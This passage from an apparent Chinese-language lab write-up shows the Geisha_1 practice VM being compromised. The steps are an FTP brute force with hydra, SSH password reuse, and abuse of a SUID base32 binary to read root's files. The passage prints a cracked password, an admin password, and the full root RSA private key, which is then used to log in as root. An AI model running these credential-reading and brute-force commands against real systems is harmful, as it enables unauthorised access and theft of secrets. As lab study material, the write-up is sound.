http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>7125/tcp open  unknown<br>8088/tcp open  radan-http<br>| http-enum: <br>|_  /info.php: Possible information file<br>9198/tcp open  unknown<br>MAC Address: 00:0C:29:B4:24:08 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 331.59 seconds<br></code></pre></td></tr></table></figure><p>有效信息并不多，汇总一下</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">21 </span>ftp <br><span class="hljs-symbol">22 </span>ssh <br><span class="hljs-symbol">80 </span>Apache <br><span class="hljs-symbol">7080 </span>LiteSpeed<br><span class="hljs-symbol">7125 </span>nginx<br><span class="hljs-symbol">8080 </span>LiteSpeed<br><span class="hljs-symbol">9198 </span>SimpleHTTPServer<br></code></pre></td></tr></table></figure><p>先尝试了一下 ftp 匿名登录（其实 nmap 脚本扫描会对 ftp 匿名登录进行检测），失败</p><p>尝试逐个目录爆破，在 7125 端口发现了 <code>/passwd</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo dirsearch -u http://192.1.1.145:7125  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.145-7125/_23-08-30_02-54-18.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-30_02-54-18.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.145:7125/<br><br>[02:54:18] Starting: <br>[02:54:37] 200 -  175B  - /index.php                                        <br>[02:54:37] 200 -  175B  - /index.php/login/                                 <br>[02:54:42] 200 -    1KB - /passwd<br></code></pre></td></tr></table></figure><p>第一反应是有没有可能是文件包含漏洞，尝试了一下并不是，不过访问&#x2F;shadow 时返回结果是 403。passwd 文件内容如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">geisha:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:geisha</span>,,,<span class="hljs-symbol">:/home/geisha</span><span class="hljs-symbol">:/bin/bash</span><br>systemd-<span class="hljs-symbol">coredump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Core</span> <span class="hljs-title class_">Dumper</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lsadm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br></code></pre></td></tr></table></figure><p>得到了一个用户名 <code>geisha</code> </p><h2 id="FTP-爆破"><a href="#FTP-爆破" class="headerlink" title="FTP 爆破"></a>FTP 爆破</h2><p>尝试 ftp 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo hydra -l geisha -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 192.1.1.145 ftp<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-29 22:54:37<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task<br>[DATA] attacking ftp://192.1.1.145:21/<br>[21][ftp] host: 192.1.1.145   login: geisha   password: letmein<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-29 22:55:33<br></code></pre></td></tr></table></figure><p>使用该密码登录 ftp 成功，进行了简单的文件收集</p><h2 id="密码重用登录ssh"><a href="#密码重用登录ssh" class="headerlink" title="密码重用登录ssh"></a>密码重用登录ssh</h2><p>尝试了一下 ssh 密码是否和 ftp 密码相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">geisha@geisha:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> geisha: <br>Sorry, user geisha may not run sudo on geisha.<br>geisha@geisha:~$ <span class="hljs-built_in">uname</span> -a<br>Linux geisha 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64 GNU/Linux</span><br>geisha@geisha:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:b4:24:08 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.145/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1779sec preferred_lft 1779sec<br>    inet6 fe80::20c:29ff:feb4:2408/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:b0:73:a4:a9 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: br-c987d2b66beb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:ee:8e:c2:ab brd ff:ff:ff:ff:ff:ff<br>    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c987d2b66beb<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::42:eeff:fe8e:c2ab/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1146: vethfb3bc15@if1145: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether 6a:c7:c5:c3:8c:15 brd ff:ff:ff:ff:ff:ff link-netnsid 0<br>    inet6 fe80::68c7:c5ff:fec3:8c15/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>1148: vethb95d0a1@if1147: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default <br>    <span class="hljs-built_in">link</span>/ether aa:f4:7a:20:c8:c9 brd ff:ff:ff:ff:ff:ff link-netnsid 1<br>    inet6 fe80::a8f4:7aff:fe20:c8c9/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>geisha@geisha:~$ <span class="hljs-built_in">id</span><br>uid=1000(geisha) gid=1000(geisha) <span class="hljs-built_in">groups</span>=1000(geisha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br></code></pre></td></tr></table></figure><p>登录成功</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>开始考虑如何提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">geisha@geisha:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>  1972743    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>  1972645     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>  2359743     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>  1969427     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp<br>  1966119     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd<br>  1969808     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount<br>  1969565     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su<br>  1966116     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh<br>  1967637     44 -rwsr-sr-x   1 root     root          43712 Feb 28  2019 /usr/bin/base32<br>  1967184    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo<br>  1966118     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd<br>  1966115     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn<br>  1969806     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount<br></code></pre></td></tr></table></figure><p>看到 base32 是 SUID，看来可以实现任意文件读取，尝试读取了 shadow 文件，但是爆破不出来 root 的密码</p><p>接下来我尝试了检查定时任务、passwd 和 shadow 文件权限、linpeas 结果汇总</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-number">21</span> ftp geisha:letmein<br><span class="hljs-number">22</span> ssh geisha:letmein<br><span class="hljs-number">80</span> Apache  <span class="hljs-regexp">/var/</span>www/html<br><span class="hljs-number">7080</span> LiteSpeed <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lsws/</span>admin/html<br><br><span class="hljs-number">7125</span> <span class="hljs-regexp">/opt/</span>nginx/www<br><span class="hljs-number">9198</span> root python -m SimpleHTTPServer <span class="hljs-number">9198</span><br><br># 利用base32读取了adminpasswd文件<br>base32 <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lsws/</span>adminpasswd | base32 --decode<br>WebAdmin user<span class="hljs-regexp">/password is admin/</span>NTk4MTQ3<br><br>docker-containerd-shim -namespace moby -workdir <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containerd<span class="hljs-regexp">/daemon/i</span>o.containerd.<span class="hljs-keyword">runtime</span>.v1.linux<span class="hljs-regexp">/moby/</span>d53b34acf079c584129574b2b1925ff972ccc0762b53a872daa55704c2913f9e -address <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker/</span>containerd<span class="hljs-regexp">/containerd.sock -containerd-binary /u</span>sr<span class="hljs-regexp">/bin/</span>docker-containerd -<span class="hljs-keyword">runtime</span>-root <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker/</span><span class="hljs-keyword">runtime</span>-runc<br><br></code></pre></td></tr></table></figure><p>尝试使用得到的密码进行 john 爆破，失败</p><p>由于没有 gcc，所以没考虑内核提权，在这里卡了很久。原本以为的思路是：网站某个路径是可以通过 <code>admin/NTk4MTQ3</code> 来登录进去，或许上传的文件默认是 root 权限，进而反弹 shell 提权。但是并没有找到这样的路径</p><h2 id="base32-SUID-读取-ssh-文件夹中的敏感文件"><a href="#base32-SUID-读取-ssh-文件夹中的敏感文件" class="headerlink" title="base32 SUID 读取 .ssh 文件夹中的敏感文件"></a>base32 SUID 读取 .ssh 文件夹中的敏感文件</h2><p>最后看了 WP，发现是利用 base32 可以实现任意文件读取的特点，尝试读取 root 目录下的 <code>.ssh</code> 文件夹中的敏感文件。这个确实没考虑到，我倒是尝试了直接读取 flag 是成功的（尝试了 root.txt 和 flag.txt）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">geisha@geisha:/etc/ssh$ <span class="hljs-built_in">base32</span> /root/root.txt | <span class="hljs-built_in">base32</span> --decode<br><span class="hljs-built_in">base32</span>: /root/root.txt: No such file or directory<br>geisha@geisha:/etc/ssh$ <span class="hljs-built_in">base32</span> /root/flag.txt | <span class="hljs-built_in">base32</span> --decode<br>Flag&#123;Sun_CTF_220_5_G31sha&#125;<br>geisha@geisha:/etc/ssh$ <span class="hljs-built_in">base32</span> /root/.ssh/id_rsa | <span class="hljs-built_in">base32</span> --decode<br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4<br>OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5<br>89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd<br>5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6<br>fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26<br>TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww<br>WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U<br>1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR<br>Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb<br>8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+<br>10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO<br>jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o<br>2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/<br>cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl<br>THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub<br>RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH<br>xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE<br>1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr<br>edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ<br>65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/<br>XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh<br>zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf<br>v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M<br>OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv<br>bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ vim rsakey               <br><br><br>┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ <span class="hljs-built_in">chmod</span> 600 rsakey<br><br><br>┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ ssh -i rsakey root@192.1.1.145                                                                <br>Linux geisha 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat May  9 12:03:57 2020 from 192.168.1.21<br>root@geisha:~<span class="hljs-comment"># cd /root</span><br>root@geisha:~<span class="hljs-comment"># ls</span><br>flag.txt<br>root@geisha:~<span class="hljs-comment"># whoami</span><br>root<br>root@geisha:~<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span 